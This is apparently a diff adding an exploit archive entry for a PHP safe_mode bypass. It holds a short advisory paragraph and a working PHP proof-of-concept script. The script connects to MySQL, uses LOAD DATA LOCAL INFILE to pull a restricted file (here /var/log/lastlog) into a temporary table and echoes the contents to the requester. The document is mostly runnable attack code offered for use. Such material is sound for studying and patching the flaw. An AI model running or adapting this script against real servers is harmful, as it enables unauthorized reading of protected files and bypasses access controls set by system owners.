@@ -1,0 +1,66 @@
+source: http://www.securityfocus.com/bid/4026/info
+
+PHP's 'safe_mode' feature may be used to restrict access to certain areas of a filesystem by PHP scripts. However, a problem has been discovered that may allow an attacker to bypass these restrictions to gain unauthorized access to areas of the filesystem that are restricted when PHP 'safe_mode' is enabled. 
+
+In particular, the MySQL client library that ships with PHP fails to properly honor 'safe_mode'. As a result, a user can issue a LOAD DATA statement to read files that reside in restricted areas of the filesystem (as determined by 'safe_mode').
+
+<?
+
+/*
+   PHP Safe Mode Problem
+
+   This script will connect to a database server running locally or
+otherwise,
+   create a temporary table with one column, use the LOAD DATA statement
+to
+   read a (possibly binary) file, then reads it back to the client.
+
+   Any type of file may pass through this 'proxy'. Although unrelated,
+this
+   may also be used to access files on the DB server (although they must
+be
+   world-readable or in MySQLd's basedir, according to docs).
+*/
+
+
+$host = 'localhost';
+$user = 'root';
+$pass = 'letmein';
+$db   = 'test_database';
+
+$filename = '/var/log/lastlog';     /* File to grab from [local] server */
+$local = true;                      /* Read from local filesystem */
+
+$local = $local ? 'LOCAL' : '';
+
+
+$sql = array (
+   "USE $db",
+
+   'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
+
+   "LOAD DATA $local INFILE '$filename' INTO TABLE $tbl FIELDS "
+   . "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
+   . "ESCAPED BY          '' "
+   . "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
+
+   "SELECT a FROM $tbl LIMIT 1"
+);
+
+Header ('Content-type: text/plain');
+
+mysql_connect ($host, $user, $pass);
+
+foreach ($sql as $statement) {
+   $q = mysql_query ($statement);
+
+   if ($q == false) die (
+      "FAILED: " . $statement . "\n" .
+      "REASON: " . mysql_error () . "\n"
+   );
+
+   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
+
+   echo $r [0];
+   mysql_free_result ($q);
+}
